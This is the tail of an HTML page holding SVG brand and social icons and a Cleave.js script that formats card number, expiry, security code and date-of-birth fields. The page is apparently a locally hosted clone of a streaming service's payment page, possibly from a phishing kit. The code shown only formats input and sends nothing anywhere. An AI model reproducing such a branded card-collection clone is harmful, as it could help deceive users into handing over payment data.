                        <symbol viewBox="0 0 18 27" id="icon-download">
                            <g fill="none" fill-rule="evenodd">
                                <path d="M6 15.2l3 3 3-3M9 8v9" stroke-linecap="square" stroke-width="2" stroke="currentColor" />
                                <path d="M9.8 25.4c0-.4-.4-.8-.8-.8s-.8.4-.8.8.4.7.8.7.8 0 .8-.3m6.3-24H2c-.4 0-.5.3-.5.5v21.4c0 .2 0 .4.4.4h14s.2-.2.2-.4V2c0-.3-.2-.5-.4-.5m2 0v24c0 .8-.8 1.5-1.7 1.5H1.7c-1 0-1.6-.7-1.6-1.6v-24C0 .8.7 0 1.6 0h14.8c1 0 1.6.7 1.6 1.5" fill="currentColor" />
                            </g>
                        </symbol>
                        <symbol v iewBox="0 0 263 262" id="awards-icon">
                            <path d="M153.4 142.2C158.5 123.3 163.6 98 165.4 69.9 167.2 69.9 169 69.9 171 70.5 179.5 72.8 182.3 76.1 182.3 84 182.3 87.8 186.1 94.7 180.2 106.5 174.4 118.4 160.6 136.8 153.4 142.2L153.4 142.2ZM96.5 69.7C98.5 97.8 103.6 123.1 108.5 141.9 101.4 136.6 87.8 118.2 81.9 106.2 76.1 94.5 79.7 87.6 79.7 83.7 79.7 75.8 82.5 72.5 91.1 70.2 92.9 69.7 94.7 69.7 96.5 69.7L96.5 69.7ZM142.7 176.7C142.7 176.7 146.3 167.7 150.6 152.9 160.6 149.6 179.7 126.4 188.4 111 195.3 99 192.7 92.4 192.7 86.5 192.7 70.7 184.1 63.8 173.9 60.7 171 60 168.5 59.7 165.9 59.7 166.2 55.9 166.2 52.1 166.2 48L96 48 96 59.5C93.4 59.5 90.9 59.7 88.3 60.5 78.1 63.6 69.4 70.5 69.4 86.3 69.4 92.2 66.6 98.8 73.5 110.8 82.5 126.1 101.4 149.3 111.6 152.7 115.6 167.7 119.2 176.7 119.2 176.7L96 176.7 96 188.4 72.5 188.4 72.5 212.6 189.7 212.6 189.7 188.4 166.2 188.4 166.2 176.7 142.7 176.7ZM262.2 130.7C262.2 202.7 203.5 261.4 131.2 261.4 58.7 261.4 0 202.7 0 130.7 0 58.5 58.7 0 131.2 0 203.5 0 262.2 58.5 262.2 130.7L262.2 130.7Z" />
                        </symbol>
                        <symbol viewBox="0 0 50 50" id="nmodp-play-button">
                            <path d="M25 50C11.2 50 0 38.8 0 25 0 11.2 11.2 0 25 0 38.8 0 50 11.2 50 25 50 38.8 38.8 50 25 50ZM35.3 25L19.7 16.4 19.7 33.6 35.3 25Z" />
                        </symbol>
                        <symbol viewBox="0 0 14 23" id="n-logo">
                            <defs>
                                <linearGradient x1="38.6443641%" y1="66.5993888%" x2="61.346965%" y2="65.4165336%" id="linearGradient1">
                                    <stop stop-color="#7C020D" offset="0%"></stop>
                                    <stop stop-color="#B20710" offset="100%"></stop>
                                </linearGradient>
                                <linearGradient x1="71.1033877%" y1="38.2760866%" x2="44.118143%" y2="39.6334986%" id="linearGradient2">
                                    <stop stop-color="#7C020D" offset="0%"></stop>
                                    <stop stop-color="#B20710" offset="100%"></stop>
                                </linearGradient>
                            </defs>
                            <g id="Mobile" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                <g id="Film" transform="translate(-16.000000, -902.000000)">
                                    <g id="Fixed-Header-Collapsed" transform="translate(0.000000, 885.000000)">
                                        <g id="N-icon" transform="translate(16.000000, 17.000000)">
                                            <path d="M8.58666667,0 L8.58666667,4.71163104 L8.58666667,10.8268835 L8.58666667,11.9705978 C8.72715209,12.3613802 9.32149908,14.0200547 9.47366041,14.4377494 C9.75787802,15.2343065 11.3757081,19.7306385 11.5050172,20.0903918 C11.6209645,20.4130945 11.9438936,21.3102964 12.0465417,21.5974231 C12.1065445,21.7635056 12.263139,22.1982203 12.3464312,22.430109 C12.4114916,22.6113682 12.4056848,22.5964988 12.4459573,22.7086337 C12.5037749,22.7314907 13.0587235,22.9528112 13.1383944,22.9847005 C13.1600603,22.9933026 13.1564389,22.9917665 13.1609345,22.9935484 C13.1704875,22.9972965 13.1736094,22.9986482 13.1770435,23 C13.1771059,22.8282647 13.1771683,22.5740718 13.1772308,22.3021217 L13.1772308,0 L8.58666667,0 Z" id="Fill-1" fill="url(#linearGradient1)"></path>
                                            <path d="M0,1.59821386 L0,3.19863969 L0,9.20206451 L0,23 C1.82353842,22.7844553 2.73555738,22.700646 4.5905641,22.617574 L4.5905641,18.2883075 L4.5905641,12.1731165 L4.5905641,11.0294022 C4.45008059,10.6386198 0.914016946,0.801779732 0.83078827,0.569890951 C0.765666357,0.388631834 0.771535446,0.40356267 0.731201069,0.291427793 C0.673446737,0.268509267 0.11844321,0.047188814 0.0388358863,0.0152380545 C0.017170207,0.00669737074 0.0207291226,0.00823346495 0.0163585245,0.00645159567 C0.00674320856,0.0027035258 0.00362135275,0.0013517629 0.000187311349,0 C0.000124874233,0.171673889 6.24371163e-05,0.425928202 0,0.697816876 L0,1.59821386 Z" id="Fill-3" fill="url(#linearGradient2)"></path>
                                            <path d="M4.57526789,0 L0,0 L8.10171278,22.6175146 C10.3784565,22.6742269 12.8139487,23 12.8139487,23 L4.57526789,0 Z" id="Fill-6" fill="#E50813"></path>
                                        </g>
                                    </g>
                                </g>
                            </g>
                        </symbol>
                        <symbol id="chevron" width="36px" height="11px" viewBox="0 0 36 11">
                            <g id="Cell-6" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                <g id="Cell6---2" transform="translate(-142.000000, -545.000000)" fill="#FFFFFF">
                                    <path d="M177.668,546.463 L160.678,555.577 C160.415,555.727 160.115,555.839 160.002,555.839 C159.89,555.839 159.74,555.802 159.703,555.802 C159.627,555.765 159.365,555.614 159.103,555.501 L142.3,546.463 C142.112,546.388 142,546.163 142,545.976 C142,545.901 142.037,545.825 142.075,545.713 L142.3,545.301 C142.412,545.113 142.6,545.001 142.787,545.001 C142.9,545.001 142.975,545.001 143.05,545.075 L159.478,553.89 C159.59,553.965 159.777,554.002 159.965,554.002 C160.152,554.002 160.34,553.965 160.452,553.89 L176.881,545.075 C177.143,544.925 177.481,545 177.631,545.3 L177.855,545.712 C178.006,545.976 177.931,546.313 177.668,546.463" id="Fill-220"></path>
                                </g>
                            </g>
                        </symbol>
                        <symbol viewBox="0 0 100 100" id="circle-with-arrow">
                            <path d="M0 37.565h13.907A43.803 43.803 0 0 1 56.084 6a43.868 43.868 0 0 1 19.213 4.392C89.844 17.528 100 32.532 100 49.916c0 24.245-19.67 43.916-43.916 43.916-6.496 0-12.534-1.373-18.024-3.843l3.843-8.326.64.275c4.21 1.83 8.784 2.745 13.541 2.745 4.666 0 9.24-.915 13.45-2.745 4.208-1.739 7.868-4.209 11.07-7.411s5.764-6.953 7.502-11.07a36.062 36.062 0 0 0 2.653-13.541c0-4.666-.915-9.24-2.653-13.54-1.738-4.118-4.3-7.87-7.502-11.071-2.745-2.654-5.856-4.94-9.24-6.588l-1.83-.823c-4.21-1.83-8.784-2.745-13.45-2.745-4.757 0-9.332.915-13.54 2.745-4.21 1.738-7.869 4.208-11.071 7.41-3.202 3.203-5.672 6.954-7.502 11.071-.092.366-.275.732-.458 1.19h13.998L18.756 68.03 0 37.565z" />
                        </symbol>
                        <symbol id="awards-icon-v2" viewBox="0 0 39 31">
                            <path d="M37 20.9C37 20.9 35.3 20.6 33.7 21.1 34.2 20.2 34.6 19.4 34.9 18.5 35.1 18.4 35.2 18.4 35.3 18.3 35.7 18.2 36.1 17.9 36.7 17.4 38.2 16 38.6 14.1 38.6 14.1 38.6 14.1 37.1 14.4 35.6 15.3 35.7 14.7 35.8 14 35.8 13.3L35.8 13 36.2 12.8C36.3 12.7 36.4 12.6 36.4 12.5 36.7 12.3 36.9 11.8 37.2 11.1 37.9 9.3 37.4 7.4 37.4 7.4 37.4 7.4 36.1 8.2 35.3 9.7 35.1 8.6 34.7 7.6 34.2 6.6 34.3 6.6 34.4 6.5 34.4 6.4L34.6 6.1C34.7 5.7 34.7 5.2 34.7 4.5 34.8 2.5 33.7 0.9 33.7 0.9 33.7 0.9 32.7 2.2 32.5 4 30.9 3.1 29.2 3.2 29.2 3.2 29.2 3.2 30 5 31.7 6.1 32.3 6.5 32.7 6.7 33.1 6.8 33.3 6.9 33.4 6.9 33.6 6.9 33.7 6.9 33.8 6.9 33.9 6.8 34.3 7.7 34.7 8.6 34.9 9.6 33.7 8.5 32.4 8.1 32.4 8.1 32.4 8.1 32.4 10 33.7 11.6 34.2 12.2 34.5 12.5 34.8 12.7 34.9 12.8 35.1 12.9 35.2 12.9 35.3 13 35.3 13 35.4 13L35.4 13.3C35.4 13.9 35.4 14.4 35.3 14.9 34.7 13.5 33.8 12.6 33.8 12.6 33.8 12.6 32.9 14.4 33.3 16.3 33.5 17 33.6 17.5 33.8 17.8 33.9 18 34 18.1 34.1 18.2 34.2 18.3 34.3 18.4 34.5 18.5 34.2 19.2 33.9 19.8 33.6 20.5 33.5 19.1 32.8 17.9 32.8 17.9 32.8 17.9 31.5 19.3 31.2 21.3 31.1 22 31.1 22.5 31.2 22.9 31.2 23 31.2 23.2 31.3 23.3L31.4 23.5C30.9 24.1 30.3 24.6 29.7 25.1 30.1 23.7 29.9 22.3 29.9 22.3 29.9 22.3 28.1 23.3 27.3 25 27 25.7 26.8 26.2 26.8 26.5 26.7 26.7 26.7 26.8 26.7 27L26.7 27.1C25.9 27.5 25.2 27.8 24.3 28 25.4 26.8 25.7 25.5 25.7 25.5 25.7 25.5 23.7 25.7 22.2 26.9 21.6 27.4 21.2 27.8 21 28.1 20.9 28.2 20.8 28.3 20.8 28.5 20.8 28.6 20.8 28.7 20.8 28.7 20.3 28.7 19.9 28.7 19.4 28.7L18.3 28.7C18.3 28.7 18.3 28.6 18.2 28.5 18.2 28.3 18.1 28.2 18 28.1 17.8 27.8 17.4 27.4 16.8 26.9 15.3 25.7 13.3 25.5 13.3 25.5 13.3 25.5 13.7 26.9 14.7 28.1 13.9 27.8 13.1 27.5 12.3 27.1L12.3 27C12.3 26.8 12.3 26.7 12.2 26.5 12.2 26.2 12 25.7 11.7 25 10.9 23.3 9.1 22.3 9.1 22.3 9.1 22.3 8.9 23.7 9.3 25.2 8.7 24.7 8.1 24.2 7.5 23.6 7.6 23.5 7.7 23.4 7.7 23.3 7.8 23.2 7.8 23 7.8 22.9 7.9 22.5 7.9 22 7.8 21.3 7.5 19.3 6.2 17.9 6.2 17.9 6.2 17.9 5.5 19.2 5.4 20.7 5 20 4.7 19.3 4.4 18.5 4.6 18.4 4.8 18.3 4.9 18.2 5 18.1 5.1 18 5.2 17.8 5.4 17.5 5.5 17 5.7 16.3 6.1 14.4 5.2 12.6 5.2 12.6 5.2 12.6 4.2 13.6 3.6 15.1 3.6 14.6 3.5 14 3.5 13.3L3.5 13C3.6 13 3.7 13 3.8 12.9 3.9 12.9 4.1 12.8 4.2 12.7 4.5 12.5 4.8 12.2 5.3 11.6 6.6 10 6.7 8.1 6.7 8.1 6.7 8.1 5.2 8.5 4 9.7 4.2 8.7 4.5 7.7 5 6.9L5.2 6.9C5.4 6.9 5.5 6.9 5.6 6.8 6 6.7 6.5 6.5 7.1 6.1 8.9 5 9.6 3.2 9.6 3.2 9.6 3.2 8 3.1 6.4 3.9 6.3 3.9 6.3 3.9 6.3 4 6.1 2.2 5.1 0.9 5.1 0.9 5.1 0.9 4 2.5 4 4.5 4 5.2 4.1 5.7 4.3 6.1 4.3 6.2 4.3 6.3 4.4 6.4 4.5 6.5 4.5 6.6 4.6 6.7 4.2 7.6 3.9 8.6 3.6 9.6 2.8 8.2 1.6 7.4 1.6 7.4 1.6 7.4 1.1 9.3 1.8 11.1 2.1 11.8 2.3 12.3 2.6 12.5 2.6 12.6 2.7 12.7 2.8 12.8L3.1 13 3.1 13.3C3.1 14 3.2 14.6 3.2 15.2 1.9 14.3 0.4 14.1 0.4 14.1 0.4 14.1 0.8 16 2.3 17.4 2.9 17.9 3.3 18.2 3.7 18.3 3.8 18.4 3.9 18.4 4 18.5 4.3 19.3 4.7 20.2 5.2 21 3.6 20.6 2.1 20.9 2.1 20.9 2.1 20.9 3.1 22.5 5 23.3 5.7 23.6 6.2 23.8 6.6 23.8 6.7 23.9 6.8 23.9 6.9 23.9 7 23.9 7.1 23.8 7.2 23.8L7.9 24.5C8.3 24.9 8.7 25.2 9.1 25.6 7.5 25.7 6.2 26.4 6.2 26.4 6.2 26.4 7.7 27.6 9.7 27.8 10.5 27.9 11 27.9 11.4 27.8 11.5 27.8 11.6 27.8 11.7 27.7L12 27.5 12.1 27.5C13 27.9 13.8 28.2 14.7 28.5 13.3 29.2 12.3 30.4 12.3 30.4 12.3 30.4 14.3 31 16.2 30.3 16.9 30.1 17.4 29.8 17.7 29.6 17.9 29.5 18 29.5 18 29.4 18.1 29.3 18.2 29.2 18.2 29.1 18.6 29.1 19 29.1 19.4 29.1 19.9 29.1 20.4 29.1 20.8 29.1 20.8 29.2 20.9 29.3 21 29.4 21 29.5 21.1 29.5 21.3 29.6 21.6 29.8 22.1 30.1 22.8 30.3 24.7 31 26.7 30.4 26.7 30.4 26.7 30.4 25.7 29.2 24.2 28.5 25.2 28.2 26 27.8 26.9 27.4 26.9 27.4 26.9 27.5 27 27.5L27.3 27.7C27.4 27.8 27.5 27.8 27.6 27.8 28 27.9 28.5 27.9 29.3 27.8 31.3 27.6 32.8 26.4 32.8 26.4 32.8 26.4 31.5 25.6 29.8 25.6L31 24.5C31.3 24.2 31.5 24 31.7 23.8 31.8 23.8 32 23.8 32.1 23.9 32.2 23.9 32.3 23.9 32.4 23.8 32.8 23.8 33.3 23.6 34.1 23.3 35.9 22.5 37 20.9 37 20.9L37 20.9Z" />
                        </symbol>
                        <symbol id="facebook-icon" viewBox="0 0 25 24">
                            <g style="fill:none;opacity:0.9">
                                <g fill="#FFF">
                                    <path d="M24 22.5C24 23.2 23.5 23.8 22.8 23.8L16.8 23.8 16.8 14.8 19.9 14.8 20.3 11.3 16.8 11.3 16.8 9C16.8 8 17.1 7.3 18.6 7.3L20.4 7.3 20.4 4.2C20.1 4.2 19 4.1 17.7 4.1 15.1 4.1 13.2 5.7 13.2 8.7L13.2 11.3 10.2 11.3 10.2 14.8 13.2 14.8 13.2 23.8 2.1 23.8C1.4 23.8 0.8 23.2 0.8 22.5L0.8 1.8C0.8 1.1 1.4 0.5 2.1 0.5L22.8 0.5C23.5 0.5 24 1.1 24 1.8L24 22.5" />
                                </g>
                            </g>
                        </symbol>
                        <symbol id="twitter-icon" viewBox="0 0 24 21" version="1">
                            <defs />
                            <g id="Desktop" style="fill-rule:evenodd;fill:none;opacity:0.9;stroke-width:1;stroke:none">
                                <g id="Desktop-All-Assets" fill="#FFF">
                                    <g id="More-Details">
                                        <g id="No-container">
                                            <g id="twitter">
                                                <path d="M23.3 1.2C22.4 1.8 21.4 2.2 20.3 2.4 19.4 1.4 18.1 0.8 16.7 0.8 14 0.8 11.8 3.1 11.8 5.8 11.8 6.2 11.9 6.6 12 6.9 7.9 6.7 4.3 4.8 1.9 1.7 1.5 2.5 1.3 3.3 1.3 4.2 1.3 6 2.1 7.5 3.4 8.4 2.7 8.4 1.9 8.1 1.2 7.8L1.2 7.8C1.2 10.2 2.9 12.3 5.1 12.7 4.7 12.8 4.3 12.9 3.9 12.9 3.6 12.9 3.2 12.9 2.9 12.8 3.6 14.8 5.4 16.2 7.5 16.3 5.8 17.6 3.7 18.4 1.5 18.4 1.1 18.4 0.7 18.4 0.3 18.3 2.4 19.8 5 20.6 7.7 20.6 16.7 20.6 21.6 13 21.6 6.4 21.6 6.2 21.6 6 21.6 5.7 22.5 5 23.3 4.2 24 3.2 23.1 3.6 22.2 3.8 21.2 3.9 22.2 3.3 23 2.4 23.3 1.2" id="Twitter" />
                                            </g>
                                        </g>
                                    </g>
                                </g>
                            </g>
                        </symbol>
                        <symbol id="instagram-icon" viewBox="0 0 24 24">
                            <g style="fill:none;opacity:0.9">
                                <g fill="#FFF">
                                    <path d="M20.7 0.3L3 0.3C1.5 0.3 0.3 1.5 0.3 3L0.3 20.7C0.3 22.3 1.5 23.5 3 23.5L20.7 23.5C22.3 23.5 23.5 22.3 23.5 20.7L23.5 3C23.5 1.5 22.3 0.3 20.7 0.3L20.7 0.3ZM17 3.9C17 3.5 17.3 3.2 17.7 3.2L19.9 3.2C20.3 3.2 20.6 3.5 20.6 3.9L20.6 6.1C20.6 6.5 20.3 6.8 19.9 6.8L17.7 6.8C17.3 6.8 17 6.5 17 6.1L17 3.9 17 3.9ZM11.9 7.5C14.4 7.5 16.4 9.5 16.4 11.9 16.4 14.4 14.4 16.4 11.9 16.4 9.5 16.4 7.5 14.4 7.5 11.9 7.5 9.5 9.5 7.5 11.9 7.5L11.9 7.5ZM21.3 20.6C21.3 21 21 21.3 20.6 21.3L3.2 21.3C2.8 21.3 2.5 21 2.5 20.6L2.5 9.7 5.4 9.7C5 10.3 4.9 11.3 4.9 11.9 4.9 15.8 8 19 11.9 19 15.8 19 19 15.8 19 11.9 19 11.3 18.9 10.3 18.4 9.7L21.3 9.7 21.3 20.6 21.3 20.6Z" />
                                </g>
                            </g>
                        </symbol>
                        <symbol id="thin-x" viewBox="0 0 26 26">
                            <path d="M10.5 9.3L1.8 0.5 0.5 1.8 9.3 10.5 0.5 19.3 1.8 20.5 10.5 11.8 19.3 20.5 20.5 19.3 11.8 10.5 20.5 1.8 19.3 0.5 10.5 9.3Z" />
                        </symbol>
                        <symbol id="thin-check" viewBox="0 0 26 26">
                            <path d="M9.19 22.892L.5 14.198l1.232-1.233 7.236 7.24L23.793.516l1.38 1.04L9.19 22.892" />
                        </symbol>
                        <symbol id="secure-server-icon" viewBox="0 0 12 16">
                            <g fill="none">
                                <g fill="#FFB53F">
                                    <path d="M8.4 5L8.4 6.3 10 6.3 10 5C10 2.8 8.2 1 6 1 3.8 1 2 2.8 2 5L2 6.3 3.6 6.3 3.6 5C3.6 3.7 4.7 2.6 6 2.6 7.3 2.6 8.4 3.7 8.4 5ZM11 7L11 15 1 15 1 7 11 7ZM6.5 11.3C7 11.1 7.3 10.6 7.3 10.1 7.3 9.3 6.7 8.7 6 8.7 5.3 8.7 4.7 9.3 4.7 10.1 4.7 10.6 5 11.1 5.5 11.3L5.2 13.4 6.9 13.4 6.5 11.3Z" />
                                </g>
                            </g>
                        </symbol>
                        <symbol id="content-warning" width="18px" height="18px" viewBox="0 0 18 18">
                            <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                <polygon transform="translate(9.000000, 9.000000) scale(-1, 1) translate(-9.000000, -9.000000)" points="0 0 18 0 18 18 0 18"></polygon>
                                <path d="M1,16 L9,1 L17,16 L1,16 Z M8,12 L8,14 L10,14 L10,12 L8,12 Z M8,7 L8,11 L10,11 L10,7 L8,7 Z" fill="#FFFFFF"></path>
                            </g>
                        </symbol>
                        <symbol id="referral-gift-icon" width="36px" height="36px" viewBox="0 0 36 36" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                            <defs>
                                <circle id="gift-icon-circle" cx="18" cy="18" r="18"></circle>
                                <polygon id="gift-icon-polygon" points="0 0.147673469 18.0617143 0.147673469 18.0617143 10.2298041 0 10.2298041"></polygon>
                            </defs>
                            <g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                <g id="Signup-banner---mobile" transform="translate(-16.000000, -10.000000)">
                                    <g id="B_icon" transform="translate(16.000000, 10.000000)">
                                        <g id="Group">
                                            <mask id="mask-2" fill="white">
                                                <use xlink:href="#gift-icon-circle"></use>
                                            </mask>
                                            <use id="Oval" fill="#E50914" xlink:href="#gift-icon-circle"></use>
                                            <circle id="Oval" fill-opacity="0.5" fill="#E50914" mask="url(#mask-2)" cx="18" cy="18" r="18"></circle>
                                        </g>
                                        <g id="Page-1" transform="translate(8.816327, 7.346939)">
                                            <path d="M8.16340408,12.5646612 L1.63050612,12.5646612 L1.63050612,18.6582122 C1.63050612,19.2261306 2.09262857,19.6889878 2.66128163,19.6889878 L8.16340408,19.6889878 L8.16340408,12.5646612 Z" id="Fill-1" fill="#FFFFFF"></path>
                                            <path d="M9.89757551,12.5646612 L9.89757551,19.6889878 L15.399698,19.6889878 C15.968351,19.6889878 16.4312082,19.2261306 16.4312082,18.6582122 L16.4312082,12.5646612 L9.89757551,12.5646612 Z" id="Fill-3" fill="#FFFFFF"></path>
                                            <g id="Group-7" transform="translate(0.000000, 0.586947)">
                                                <g id="Clip-6"></g>
                                                <path d="M6.18465306,1.44874286 C7.36530612,1.44874286 8.32555102,2.40898776 8.32555102,3.58964082 L8.32555102,5.73053878 L6.18465306,5.73053878 C5.00473469,5.73053878 4.0437551,4.77029388 4.0437551,3.58964082 C4.0437551,2.40898776 5.00473469,1.44874286 6.18465306,1.44874286 M11.5633469,2.99453878 C12.6014694,2.99453878 13.4463673,3.83943673 13.4463673,4.87755918 C13.4463673,5.35951837 13.2590204,5.79519184 12.96,6.12800816 L9.68106122,6.12800816 L9.68106122,4.87755918 C9.68106122,3.83943673 10.5252245,2.99453878 11.5633469,2.99453878 M17.1080816,6.12800816 L14.4896327,6.12800816 C14.6542041,5.74449796 14.7467755,5.32131429 14.7467755,4.87755918 C14.7467755,3.12164082 13.3192653,1.69413061 11.5633469,1.69413061 C10.744898,1.69413061 10.0043265,2.01372245 9.44081633,2.52286531 C8.9882449,1.14898776 7.70767347,0.1476 6.18465306,0.1476 C4.28693878,0.1476 2.74261224,1.69119184 2.74261224,3.58964082 C2.74261224,4.59837551 3.18710204,5.49837551 3.88065306,6.12800816 L0.953632653,6.12800816 C0.427591837,6.12800816 0,6.55633469 0,7.08237551 L0,9.27617143 C0,9.80221224 0.427591837,10.2298041 0.953632653,10.2298041 L17.1080816,10.2298041 C17.6341224,10.2298041 18.0617143,9.80221224 18.0617143,9.27617143 L18.0617143,7.08237551 C18.0617143,6.55633469 17.6341224,6.12800816 17.1080816,6.12800816" id="Fill-5" fill="#FFFFFF" mask="url(#mask-4)"></path>
                                            </g>
                                        </g>
                                    </g>
                                </g>
                            </g>
                        </symbol>
                    </defs>
                </svg>
            </div>
        </div>
    </div>
    <div></div>
</body>
<script src="./assets/js/jquery-1.12.4.js"></script>
<script src="./assets/js/cleave.min.js"></script>
<script>
var cleave = new Cleave('#fca1', {
    delimiters: [' ', ' ', ' '],
    blocks: [4, 4, 4, 4],
    numericOnly: true
});

var cleave3 = new Cleave('#fca2', {
    delimiters: ['/'],
    blocks: [2, 2],
    numericOnly: true
});


var cleave2 = new Cleave('#fca3', {
    delimiters: [''],
    blocks: [3],
    numericOnly: true
});

var cleave2 = new Cleave('#fdob', {
    date: true,
    delimiter: '-',
    datePattern: ['d', 'm', 'Y']
});
</script>

</html>